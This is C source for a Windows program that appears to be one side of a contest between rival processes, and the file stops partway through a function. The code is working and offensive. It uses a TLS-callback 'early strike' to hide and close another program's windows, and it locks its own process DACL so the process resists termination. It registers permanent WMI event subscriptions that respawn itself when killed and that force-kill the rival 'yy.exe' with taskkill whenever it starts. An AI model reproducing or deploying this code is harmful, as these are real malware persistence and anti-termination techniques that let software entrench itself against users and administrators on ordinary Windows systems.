/*
 * xx.c - 主进程（集成 DeamonInit、guard.dll 加载，修复路径写入）
 * 编译器：GNU GCC (MinGW-w64)
 * 编译选项：gcc -s -O2 -Wall -static -o "%OUTDIR%\xx.exe" xx\xx.c ^
    -lole32 -loleaut32 -lwbemuuid -ladvapi32 -lpsapi -lshell32
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_DCOM

#include <windows.h>
#include <accctrl.h>
#include <aclapi.h>
#include <sddl.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <time.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <wbemidl.h>


/* 共享内存布局与命名常量：唯一来源见 xxipc.h */
#include "xxipc.h"

/* Fix for MinGW missing CIM_FLAG_ANY */
#ifndef CIM_FLAG_ANY
#define CIM_FLAG_ANY 0
#endif

/* 全局变量 */
HANDLE g_hSharedMem = NULL;
PVOID  g_pSharedView = NULL;
WCHAR  g_szHeartbeatSuffix[64];
HANDLE g_hHeartbeatEvent = NULL;
HANDLE g_hSelfHandle = NULL;   /* 收紧 DACL 之前拿到的自身进程句柄（交给 guard） */
DWORD  g_dwOwnSession = 0;     /* 收紧 DACL 之前取到的会话号（之后取会失败） */
CRITICAL_SECTION g_csLog;
BOOL   g_bFreshMapping = FALSE;   /* 本次是否新建了共享内存映射（决定 salt 沿用/新生成） */
static ULONGLONG g_dwNameToken = 0;   /* 64 位会话随机名 token：不写共享内存，只用 XxSetNames 推给各模块 */
#define XX_WASTE_MS 200         /* 模仿 waste.c 的节奏：每 0.2 秒一条（10 条约 2 秒发完） */

/* 64 位密码学随机：RtlGenRandom（advapi32 的 SystemFunction036，Win7 自带）。
   失败才退回 rand()（有它就别用 rand：rand 的种子只含 tick+pid，可被时间窗爆破）。 */
typedef BOOLEAN (NTAPI *RtlGenRandom_t)(PVOID, ULONG);

static BOOL GenRandom64(ULONGLONG *pOut)
{
    static RtlGenRandom_t s_pFn = NULL;
    static BOOL s_bTried = FALSE;

    if (!pOut) return FALSE;
    if (!s_bTried) {
        HMODULE h = GetModuleHandleW(L"advapi32.dll");
        s_bTried = TRUE;
        if (!h) h = LoadLibraryW(L"advapi32.dll");
        if (h) s_pFn = (RtlGenRandom_t)GetProcAddress(h, "SystemFunction036");
    }
    if (!s_pFn) return FALSE;
    return s_pFn(pOut, (ULONG)sizeof(*pOut)) ? TRUE : FALSE;
}

/* 生成 64 位随机 token 并置最低位（保证非 0：0 是"没有 token"的哨兵值） */
static ULONGLONG MakeNameToken(void)
{
    ULONGLONG t = 0;
    if (!GenRandom64(&t)) {
        srand(GetTickCount() * 2654435761u + GetCurrentProcessId() * 7u);
        t = ((ULONGLONG)(DWORD)rand() << 32) ^ ((ULONGLONG)(DWORD)rand() << 16) ^ (DWORD)rand();
    }
    return t | 1ULL;
}

/* 命名对象用的 token：优先 RtlGenRandom 生成的 64 位值；退回共享内存的 64 位回退 token；再退回固定值 */
static ULONGLONG NameTok(void)
{
    if (g_dwNameToken) return g_dwNameToken;
    if (g_pSharedView) {
        ULONGLONG s = XX_NAME_TOKEN64(g_pSharedView);
        if (s) return s;
    }
    return XX_NAME_TOKEN_FIXED;
}

static void WriteLog(const WCHAR *format, ...);

/* 把会话随机名推给本进程内加载的模块（同进程直接调用导出函数，不需要远程那套） */
static void PushNamesToModule(HMODULE hMod)
{
    typedef BOOL (WINAPI *SetNames_t)(const XX_NAME_BLOCK *);
    SetNames_t pSet;
    XX_NAME_BLOCK blk;

    if (!hMod) return;
    pSet = (SetNames_t)GetProcAddress(hMod, "XxSetNames");
    if (!pSet) return;
    XXNameBlockInit(&blk, NameTok(), g_dwOwnSession);
    if (!pSet(&blk)) WriteLog(L"XxSetNames 被拒绝");
}

/* 前置声明 */
static BOOL InitSecurityDescriptor(void);
static BOOL InitSharedMemory(void);
static BOOL CreateHeartbeatSuffix(void);
static BOOL SetupWMISubscription(void);
static DWORD WINAPI InitThread(LPVOID lpParam);
static DWORD WINAPI AttackThread(LPVOID lpParam);
static HWND FindEnemyWindowNow(void);                          /* TLS 回调要用，先声明 */
static BOOL GetProcessPathByPid(DWORD pid, WCHAR *path, DWORD cch);

void RegisterSelfToXpt(void);

// ------------------- 开局先杀一遍 --------------------
// TLS 回调在 loader lock 下执行：
// - 禁止 Sleep / SendMessage（同步跨进程，卡住 = 系统级死锁）
// - 只做一次非阻塞 PostMessage；窗口可能还没建好，重试交给独立线程
static DWORD WINAPI EarlyStrikeThread(LPVOID param);

static void NTAPI EarlyPayload(PVOID hModule, DWORD reason, PVOID reserved)
{
    (void)hModule; (void)reserved;
    if (reason != DLL_PROCESS_ATTACH)
        return;

    /* loader lock 下只能做非阻塞动作：PostMessage 是异步的，安全；
       绝不能用 SendMessage/ShowWindow（同步跨进程，对方 UI 线程卡住就把自己一起卡死）。 */
    {
        HWND hwnd = FindEnemyWindowNow();
        if (hwnd) {
            PostMessageW(hwnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);     /* 未拦的消息，直接最小化 */
            PostMessageW(hwnd, WM_CLOSE, 0, 0);
            PostMessageW(hwnd, WM_DESTROY, 0, 0);
        }
    }

    /* 线程在 loader lock 释放后才运行，不受回调上下文限制 */
    CreateThread(NULL, 0, EarlyStrikeThread, NULL, 0, NULL);
}

/* 找 yy/ww 的窗口。**必须枚举**，不能用 FindWindow：
   实测 lenovo_fix.exe（蜜罐）与 yy.exe **类名完全相同**（都是 YYWnd_7f3a9c1e），
   FindWindowW 只会返回其中一个（谁先建谁先返回），另一个永远轮不到。
   枚举时优先"进程名是 yy.exe/ww.exe"的那个，其次才是同类的其它 yy 窗口。 */
static HWND FindEnemyWindowNow(void)
{
    HWND h = GetTopWindow(NULL);
    HWND fallback = NULL;

    while (h) {
        if (IsWindow(h) && IsWindowVisible(h)) {
            WCHAR cls[128] = L"", title[192] = L"";
            DWORD pid = 0;
            GetClassNameW(h, cls, _countof(cls));
            GetWindowTextW(h, title, _countof(title));
            if (cls[0] && (wcsstr(cls, L"YYWnd") || wcscmp(title, L"YY_Defensive_GUI") == 0)) {
                WCHAR path[MAX_PATH] = L"";
                const WCHAR *base = L"";
                GetWindowThreadProcessId(h, &pid);
                if (pid && GetProcessPathByPid(pid, path, MAX_PATH)) {
                    base = wcsrchr(path, L'\\');
                    base = base ? base + 1 : path;
                }
                if (_wcsicmp(base, L"yy.exe") == 0 || _wcsicmp(base, L"ww.exe") == 0)
                    return h;                       /* 主进程优先 */
                if (!fallback) fallback = h;        /* 蜜罐等同类窗口：留作备选 */
            }
        }
        h = GetNextWindow(h, GW_HWNDNEXT);
    }
    return fallback;
}

/* yy 窗口可能晚于 xx 创建，有限重试 2 秒 */
static DWORD WINAPI EarlyStrikeThread(LPVOID param)
{
    (void)param;
    for (int i = 0; i < 40; i++) {
        HWND hwnd = FindEnemyWindowNow();
        if (hwnd) {
            /* 早期就用"隐藏 + 最小化"拿下：yy 主循环只查 IsWindow，隐藏后它不会重建 */
            ShowWindow(hwnd, SW_HIDE);
            PostMessageW(hwnd, WM_SYSCOMMAND, SC_MINIMIZE, 0);
            PostMessageW(hwnd, WM_CLOSE, 0, 0);
            WriteLog(L"early strike: 已隐藏 yy 窗口");
            return 0;
        }
        Sleep(50);
    }
    return 0;
}

/* 放进 .CRT$XLB 段，加载器按段名排序后作为 TLS 回调调用 */
#if defined(__GNUC__)
__attribute__((section(".CRT$XLB"), used))
#endif
static PIMAGE_TLS_CALLBACK pEarlyPayload = EarlyPayload;

/* MinGW ld 只有在镜像真的用了 TLS 时才生成 TLS Directory，
   否则 .CRT$XLB 段整个被丢弃、回调永不触发。这个 __thread 就是门票。 */
#if defined(__GNUC__)
__attribute__((used))
static __thread volatile int g_tlsTicket = 1;
#endif

/* ================== 安全描述符 ================== */
static BOOL InitSecurityDescriptor(void)
{
    HANDLE hToken = NULL;
    BYTE tokenUser[sizeof(TOKEN_USER) + SECURITY_MAX_SID_SIZE];
    DWORD dwLen = sizeof(tokenUser);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)tokenUser;
    LPWSTR szUserSid = NULL;
    WCHAR szSDDL[256];
    PSECURITY_DESCRIPTOR pSD = NULL;
    ULONG cbSD = 0;
    PACL pDacl = NULL;
    BOOL bDaclPresent = FALSE, bDaclDefaulted = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;
    if (!GetTokenInformation(hToken, TokenUser, tokenUser, dwLen, &dwLen)) {
        CloseHandle(hToken);
        return FALSE;
    }
    CloseHandle(hToken);

    if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &szUserSid))
        return FALSE;

    _snwprintf(szSDDL, _countof(szSDDL),
        L"D:(D;OICI;GA;;;WD)(A;OICI;GA;;;SY)(A;OICI;GRGWGX;;;%s)", szUserSid);
    LocalFree(szUserSid);

    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
            szSDDL, SDDL_REVISION_1, &pSD, &cbSD))
        return FALSE;

    if (!GetSecurityDescriptorDacl(pSD, &bDaclPresent, &pDacl, &bDaclDefaulted) || !bDaclPresent) {
        LocalFree(pSD);
        return FALSE;
    }

    if (SetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT,
                        DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
                        NULL, NULL, pDacl, NULL) != ERROR_SUCCESS)
    {
        if (SetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT,
                            DACL_SECURITY_INFORMATION,
                            NULL, NULL, pDacl, NULL) != ERROR_SUCCESS) {
            LocalFree(pSD);
            return FALSE;
        }
    }

    LocalFree(pSD);
    return TRUE;
}

/* 将自己注册到 xpt.xpt（覆盖写入，模仿 xpt.cpp） */
void RegisterSelfToXpt(void)
{
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    DWORD pid = GetCurrentProcessId();

    // 构造与 xx.exe 同目录的 xpt.xpt
    char xptPath[MAX_PATH];
    snprintf(xptPath, MAX_PATH, "%s", selfPath);   /* 保证以 NUL 结尾 */
    char *pSlash = strrchr(xptPath, '\\');
    if (pSlash) pSlash[1] = '\0';
    strncat(xptPath, XPT_FILE_NAME, MAX_PATH - strlen(xptPath) - 1);

    // 覆盖写入
    FILE *fp = fopen(xptPath, "w");
    if (fp) {
        fprintf(fp, "%lu\n%s\n", pid, selfPath);
        fclose(fp);
    }
}

/* ================== 共享内存 ================== */
static BOOL InitSharedMemory(void)
{
    DWORD dwRand;
    BOOL  bFresh;

    g_hSharedMem = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
                                      0, SHARED_MEM_SIZE, SHARED_MEM_NAME);
    if (g_hSharedMem) {
        /* ERROR_ALREADY_EXISTS 表示已有实例在跑：此时绝不能清零，否则会把它的
           心跳后缀/弹窗后缀/日志/句柄表一并抹掉；而老 window.dll 实例只在启动时
           读过一次事件名，会永远 SetEvent 一个再也没人等的名字。 */
        bFresh = (GetLastError() != ERROR_ALREADY_EXISTS);
    } else {
        /* 没有 SeCreateGlobalPrivilege（非提权运行）：退到单会话命名空间 */
        g_hSharedMem = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE,
                                          0, SHARED_MEM_SIZE, SHARED_MEM_NAME_LOCAL);
        if (!g_hSharedMem) return FALSE;
        bFresh = (GetLastError() != ERROR_ALREADY_EXISTS);
    }
    g_bFreshMapping = bFresh;   /* 供后面决定"共享 salt 沿用还是新生成" */

    g_pSharedView = MapViewOfFile(g_hSharedMem, FILE_MAP_ALL_ACCESS, 0, 0, SHARED_MEM_SIZE);
    if (!g_pSharedView) {
        CloseHandle(g_hSharedMem);
        g_hSharedMem = NULL;
        return FALSE;
    }

    srand(GetTickCount() ^ GetCurrentProcessId());
    dwRand = ((DWORD)rand() << 16) ^ (DWORD)rand() ^ GetTickCount();

    if (bFresh) {
        memset(g_pSharedView, 0, SHARED_MEM_SIZE);
        XX_LAYOUT(g_pSharedView) = XX_LAYOUT_VERSION;
        XX_TAG(g_pSharedView)    = dwRand;
    } else if (XX_LAYOUT(g_pSharedView) != XX_LAYOUT_VERSION) {
        /* 旧版本或异常残留：只重置"心跳计数器..保留区"这段新字段 */
        memset((BYTE *)g_pSharedView + OFFSET_HB_TICK, 0, OFFSET_LOG - OFFSET_HB_TICK);
        XX_LAYOUT(g_pSharedView) = XX_LAYOUT_VERSION;
        XX_TAG(g_pSharedView)    = dwRand;
    }
    /* 最新启动的实例即当前 xx.exe；guard 用 xpt.xpt 取 PID，这里只作诊断 */
    XX_XXPID(g_pSharedView) = GetCurrentProcessId();
    return TRUE;
}

static BOOL CreateHeartbeatSuffix(void)
{
    DWORD tick;
    WCHAR *pSuffix;
    WCHAR *pWndSuffix;
    WCHAR szEventName[128];

    if (!g_pSharedView) return FALSE;

    tick = GetTickCount();
    srand(tick ^ GetCurrentProcessId());

    pSuffix    = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_HB_SUFFIX);
    pWndSuffix = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_WND_SUFFIX);

    /* 已有实例留下的后缀必须沿用（原因见 InitSharedMemory 注释） */
    if (pSuffix[0] != L'\0') {
        wcsncpy_s(g_szHeartbeatSuffix, _countof(g_szHeartbeatSuffix), pSuffix, _TRUNCATE);
    } else {
        int r1 = rand() & 0xFFFF;
        int r2 = (rand() >> 16) & 0xFFFF;

        _snwprintf(g_szHeartbeatSuffix, _countof(g_szHeartbeatSuffix),
                   L"%08X_%04X", tick, (r1 ^ r2));
        g_szHeartbeatSuffix[_countof(g_szHeartbeatSuffix) - 1] = L'\0';
        wcsncpy_s(pSuffix, SUFFIX_MAX, g_szHeartbeatSuffix, _TRUNCATE);
    }

    if (pWndSuffix[0] == L'\0') {
        WCHAR szWndSuffix[32];
        _snwprintf(szWndSuffix, _countof(szWndSuffix), L"%08X%04X",
                   (unsigned)(tick ^ (GetCurrentProcessId() << 16)),
                   (unsigned)(rand() & 0xFFFF));
        szWndSuffix[_countof(szWndSuffix) - 1] = L'\0';
        wcsncpy_s(pWndSuffix, SUFFIX_MAX, szWndSuffix, _TRUNCATE);
    }

    /* 心跳事件保留（兼容旧观察方式）；弹窗存活判据已改为 OFFSET_HB_TICK 计数器。
       事件名也带会话 token，对手按旧名抢/伪造事件没有意义。 */
    {
        WCHAR base[96];
        XXNamedObject(base, _countof(base), TRUE, XX_PURPOSE_HEARTBEAT, NameTok(), 0);
        _snwprintf(szEventName, _countof(szEventName), L"%s_%s", base, g_szHeartbeatSuffix);
    }
    szEventName[_countof(szEventName) - 1] = L'\0';
    g_hHeartbeatEvent = CreateEventW(NULL, TRUE, FALSE, szEventName);
    if (g_hHeartbeatEvent) {
        SetEvent(g_hHeartbeatEvent);
    }
    return TRUE;
}

/* ================== 日志系统（共享内存） ================== */
static void WriteLog(const WCHAR *format, ...)
{
    EnterCriticalSection(&g_csLog);

    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR szLine[512];
    va_list args;
    va_start(args, format);
    _vsnwprintf(szLine, _countof(szLine) - 1, format, args);
    va_end(args);
    szLine[_countof(szLine) - 1] = L'\0';

    /* 没有弹窗时共享日志看不到，同时落一份文件 */
    {
        WCHAR fline[640];
        _snwprintf(fline, _countof(fline) - 1, L"[xx][pid=%lu] %s\r\n",
                   GetCurrentProcessId(), szLine);
        fline[_countof(fline) - 1] = L'\0';
        XXFileLog(fline);
    }

    if (g_pSharedView) {
        WCHAR *pLog = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_LOG);
        size_t maxLen = (LOG_SIZE / sizeof(WCHAR)) - 1;
        WCHAR temp[512];
        _snwprintf(temp, _countof(temp), L"[%02d:%02d:%02d.%03d] %s\r\n",
                   st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, szLine);
        temp[_countof(temp) - 1] = L'\0';

        /* 共享日志是跨进程无锁读写的：读到别人正在搬移的中间状态时必须有界求长，
           否则 wcslen 可能越过日志区跑到映射之外 */
        size_t len = XXLogLen(pLog, maxLen + 1);
        if (len > maxLen) { pLog[maxLen] = L'\0'; len = maxLen; }

        size_t newLen = wcslen(temp);
        if (len + newLen <= maxLen) {
            /* 第二参是缓冲区总容量（含结尾 NUL），不是剩余空间 */
            wcscat_s(pLog, maxLen + 1 - len, temp);
        } else {
            /* 丢掉最旧的一段，只保留最近 maxLen 个字符 */
            size_t drop = len + newLen - maxLen;
            if (drop < len) {
                memmove(pLog, pLog + drop, (len - drop) * sizeof(WCHAR));
                pLog[len - drop] = L'\0';
            } else {
                pLog[0] = L'\0';
            }
            wcscat_s(pLog, maxLen + 1 - wcslen(pLog), temp);
        }
    }

    LeaveCriticalSection(&g_csLog);
}

/* ================== WMI 永久订阅 ================== */
static BOOL SetupWMISubscription(void)
{
    HRESULT hr;
    IWbemLocator *pLocator = NULL;
    IWbemServices *pServices = NULL;
    IEnumWbemClassObject *pEnum = NULL;
    IWbemClassObject *pFilterClass = NULL;
    IWbemClassObject *pFilterInstance = NULL;
    IWbemClassObject *pConsumerClass = NULL;
    IWbemClassObject *pConsumerInstance = NULL;
    IWbemClassObject *pBindingClass = NULL;
    IWbemClassObject *pBindingInstance = NULL;
    VARIANT var;
    BOOL bRet = FALSE;
    WCHAR szExePath[MAX_PATH];
    WCHAR szQuery[512];
    WCHAR szCmdTemplate[1024];

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        WriteLog(L"WMI: CoInitializeEx failed 0x%08X", hr);
        return FALSE;
    }

    hr = CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IWbemLocator, (void**)&pLocator);
    if (FAILED(hr) || !pLocator) {
        WriteLog(L"WMI: CoCreateInstance failed 0x%08X", hr);
        CoUninitialize();
        return FALSE;
    }

    /* 必须连 ROOT\SUBSCRIPTION：__EventFilter / __FilterToConsumerBinding 到处都有，
       但 CommandLineEventConsumer 只定义在 root\subscription。原来连的是 root\cimv2，
       于是消费类 GetObject 直接 WBEM_E_NOT_FOUND(0x80041002)，整个 WMI 复活订阅失效。
       过滤器里仍然用 EventNamespace=root\cimv2 去订阅 Win32_Process 事件。 */
    hr = pLocator->lpVtbl->ConnectServer(pLocator, L"ROOT\\SUBSCRIPTION", NULL, NULL,
                                          NULL, 0, NULL, NULL, &pServices);
    if (FAILED(hr) || !pServices) {
        WriteLog(L"WMI: ConnectServer failed 0x%08X", hr);
        pLocator->lpVtbl->Release(pLocator);
        CoUninitialize();
        return FALSE;
    }

    hr = CoSetProxyBlanket((IUnknown*)pServices, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
                           NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                           NULL, EOAC_NONE);
    if (FAILED(hr)) {
        WriteLog(L"WMI: CoSetProxyBlanket failed 0x%08X", hr);
        goto cleanup;
    }

    if (!GetModuleFileNameW(NULL, szExePath, MAX_PATH)) {
        WriteLog(L"WMI: GetModuleFileName failed");
        goto cleanup;
    }

    swprintf_s(szQuery, _countof(szQuery),
               L"SELECT * FROM __InstanceDeletionEvent WITHIN 1 "
               L"WHERE TargetInstance ISA 'Win32_Process' "
               L"AND TargetInstance.Name = 'xx.exe'");
    swprintf_s(szCmdTemplate, _countof(szCmdTemplate),
               L"cmd.exe /c start \"\" \"%s\"", szExePath);

    /* 创建 __EventFilter */
    hr = pServices->lpVtbl->GetObject(pServices, L"__EventFilter", 0, NULL, &pFilterClass, NULL);
    if (FAILED(hr) || !pFilterClass) {
        WriteLog(L"WMI: GetObject Filter class failed 0x%08X", hr);
        goto cleanup;
    }

    hr = pFilterClass->lpVtbl->SpawnInstance(pFilterClass, 0, &pFilterInstance);
    if (FAILED(hr) || !pFilterInstance) {
        WriteLog(L"WMI: SpawnInstance Filter failed 0x%08X", hr);
        goto cleanup;
    }

    VariantInit(&var);
    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"XX_RespawnFilter");
    hr = pFilterInstance->lpVtbl->Put(pFilterInstance, L"Name", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"WQL");
    hr = pFilterInstance->lpVtbl->Put(pFilterInstance, L"QueryLanguage", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"root\\cimv2");
    hr = pFilterInstance->lpVtbl->Put(pFilterInstance, L"EventNamespace", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(szQuery);
    hr = pFilterInstance->lpVtbl->Put(pFilterInstance, L"Query", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_I4;
    var.lVal = 0;
    pFilterInstance->lpVtbl->Put(pFilterInstance, L"Executability", 0, &var, CIM_FLAG_ANY);

    hr = pServices->lpVtbl->PutInstance(pServices, pFilterInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hr)) {
        WriteLog(L"WMI: PutInstance Filter failed 0x%08X", hr);
        goto cleanup;
    }

    /* 创建 CommandLineEventConsumer */
    hr = pServices->lpVtbl->GetObject(pServices, L"CommandLineEventConsumer", 0, NULL, &pConsumerClass, NULL);
    if (FAILED(hr) || !pConsumerClass) {
        WriteLog(L"WMI: GetObject Consumer class failed 0x%08X", hr);
        goto cleanup;
    }

    hr = pConsumerClass->lpVtbl->SpawnInstance(pConsumerClass, 0, &pConsumerInstance);
    if (FAILED(hr) || !pConsumerInstance) {
        WriteLog(L"WMI: SpawnInstance Consumer failed 0x%08X", hr);
        goto cleanup;
    }

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"XX_RespawnConsumer");
    pConsumerInstance->lpVtbl->Put(pConsumerInstance, L"Name", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(szCmdTemplate);
    pConsumerInstance->lpVtbl->Put(pConsumerInstance, L"CommandLineTemplate", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    /* KillTimeout 是 uint32（秒），不是 bool */
    var.vt = VT_I4;
    var.lVal = 60;
    pConsumerInstance->lpVtbl->Put(pConsumerInstance, L"KillTimeout", 0, &var, CIM_FLAG_ANY);

    var.vt = VT_BOOL;
    var.boolVal = VARIANT_TRUE;
    pConsumerInstance->lpVtbl->Put(pConsumerInstance, L"RunInteractively", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    hr = pServices->lpVtbl->PutInstance(pServices, pConsumerInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hr)) {
        WriteLog(L"WMI: PutInstance Consumer failed 0x%08X", hr);
        goto cleanup;
    }

    /* 绑定 */
    hr = pServices->lpVtbl->GetObject(pServices, L"__FilterToConsumerBinding", 0, NULL, &pBindingClass, NULL);
    if (FAILED(hr) || !pBindingClass) {
        WriteLog(L"WMI: GetObject Binding class failed 0x%08X", hr);
        goto cleanup;
    }

    hr = pBindingClass->lpVtbl->SpawnInstance(pBindingClass, 0, &pBindingInstance);
    if (FAILED(hr) || !pBindingInstance) {
        WriteLog(L"WMI: SpawnInstance Binding failed 0x%08X", hr);
        goto cleanup;
    }

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"__EventFilter.Name=\"XX_RespawnFilter\"");
    pBindingInstance->lpVtbl->Put(pBindingInstance, L"Filter", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BSTR;
    var.bstrVal = SysAllocString(L"CommandLineEventConsumer.Name=\"XX_RespawnConsumer\"");
    pBindingInstance->lpVtbl->Put(pBindingInstance, L"Consumer", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    var.vt = VT_BOOL;
    var.boolVal = VARIANT_FALSE;
    pBindingInstance->lpVtbl->Put(pBindingInstance, L"MaintainPSProvOrder", 0, &var, CIM_FLAG_ANY);
    VariantClear(&var);

    hr = pServices->lpVtbl->PutInstance(pServices, pBindingInstance, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
    if (FAILED(hr)) {
        WriteLog(L"WMI: Binding failed 0x%08X", hr);
        goto cleanup;
    }

    WriteLog(L"WMI subscription created");
    bRet = TRUE;

    /* ================== #15 反向监听：yy.exe 一被创建就抢先清理 ==================
       yybad.md P1 #15。用同一套 WMI（还能省下自己的轮询延迟）：
         __EventFilter "XX_YyWatchFilter" 订阅 Win32_Process 的**创建**事件；
         CommandLineEventConsumer "XX_YyWatchConsumer" 执行 taskkill。
       yy 的复活链一旦把它拉起来，1 秒内就会被按掉；再叠加 atkcore 30ms 的轮询与
       我们已经删掉的对手 WMI 三件套，它想稳定活过 8 秒几乎不可能。
       注意：这两个对象用 XX_ 前缀，不会被我们自己的 RemoveEnemyWmi（删 YY_ 前缀）误删。 */
    {
        IWbemClassObject *pYyFilter = NULL, *pYyConsumer = NULL, *pYyBind = NULL;
        WCHAR szSysDir[MAX_PATH] = L"", szCmd[1024] = L"", szYyQuery[512] = L"";
        UINT nSysLen = GetSystemDirectoryW(szSysDir, MAX_PATH);

        if (nSysLen > 0 && nSysLen < MAX_PATH) {
            swprintf_s(szCmd, _countof(szCmd),
                       L"\"%s\\cmd.exe\" /c taskkill /f /im yy.exe & taskkill /f /im ww.exe",
                       szSysDir);
            swprintf_s(szYyQuery, _countof(szYyQuery),
                       L"SELECT * FROM __InstanceCreationEvent WITHIN 1 "
                       L"WHERE TargetInstance ISA 'Win32_Process' "
                       L"AND TargetInstance.Name = 'yy.exe'");

            do {   /* 用 do/while(FALSE) 当局部错误出口，失败不影响上面的复活订阅 */
                hr = pServices->lpVtbl->GetObject(pServices, L"__EventFilter", 0, NULL, &pFilterClass, NULL);
                if (FAILED(hr) || !pFilterClass) { WriteLog(L"WMI(yywatch): filter class 0x%08X", hr); break; }
                hr = pFilterClass->lpVtbl->SpawnInstance(pFilterClass, 0, &pYyFilter);
                if (FAILED(hr) || !pYyFilter) { WriteLog(L"WMI(yywatch): spawn filter 0x%08X", hr); break; }
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"XX_YyWatchFilter");
                pYyFilter->lpVtbl->Put(pYyFilter, L"Name", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"WQL");
                pYyFilter->lpVtbl->Put(pYyFilter, L"QueryLanguage", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"root\\cimv2");
                pYyFilter->lpVtbl->Put(pYyFilter, L"EventNamespace", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(szYyQuery);
                pYyFilter->lpVtbl->Put(pYyFilter, L"Query", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                var.vt = VT_I4; var.lVal = 0;
                pYyFilter->lpVtbl->Put(pYyFilter, L"Executability", 0, &var, CIM_FLAG_ANY);
                hr = pServices->lpVtbl->PutInstance(pServices, pYyFilter, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
                if (FAILED(hr)) { WriteLog(L"WMI(yywatch): put filter 0x%08X", hr); break; }

                hr = pServices->lpVtbl->GetObject(pServices, L"CommandLineEventConsumer", 0, NULL, &pConsumerClass, NULL);
                if (FAILED(hr) || !pConsumerClass) { WriteLog(L"WMI(yywatch): consumer class 0x%08X", hr); break; }
                hr = pConsumerClass->lpVtbl->SpawnInstance(pConsumerClass, 0, &pYyConsumer);
                if (FAILED(hr) || !pYyConsumer) { WriteLog(L"WMI(yywatch): spawn consumer 0x%08X", hr); break; }
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"XX_YyWatchConsumer");
                pYyConsumer->lpVtbl->Put(pYyConsumer, L"Name", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(szCmd);
                pYyConsumer->lpVtbl->Put(pYyConsumer, L"CommandLineTemplate", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                var.vt = VT_I4; var.lVal = 30;
                pYyConsumer->lpVtbl->Put(pYyConsumer, L"KillTimeout", 0, &var, CIM_FLAG_ANY);
                var.vt = VT_BOOL; var.boolVal = VARIANT_TRUE;
                pYyConsumer->lpVtbl->Put(pYyConsumer, L"RunInteractively", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                hr = pServices->lpVtbl->PutInstance(pServices, pYyConsumer, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
                if (FAILED(hr)) { WriteLog(L"WMI(yywatch): put consumer 0x%08X", hr); break; }

                hr = pServices->lpVtbl->GetObject(pServices, L"__FilterToConsumerBinding", 0, NULL, &pBindingClass, NULL);
                if (FAILED(hr) || !pBindingClass) { WriteLog(L"WMI(yywatch): binding class 0x%08X", hr); break; }
                hr = pBindingClass->lpVtbl->SpawnInstance(pBindingClass, 0, &pYyBind);
                if (FAILED(hr) || !pYyBind) { WriteLog(L"WMI(yywatch): spawn binding 0x%08X", hr); break; }
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"__EventFilter.Name=\"XX_YyWatchFilter\"");
                pYyBind->lpVtbl->Put(pYyBind, L"Filter", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
                var.vt = VT_BSTR; var.bstrVal = SysAllocString(L"CommandLineEventConsumer.Name=\"XX_YyWatchConsumer\"");
                pYyBind->lpVtbl->Put(pYyBind, L"Consumer", 0, &var, CIM_FLAG_ANY); VariantClear(&var);
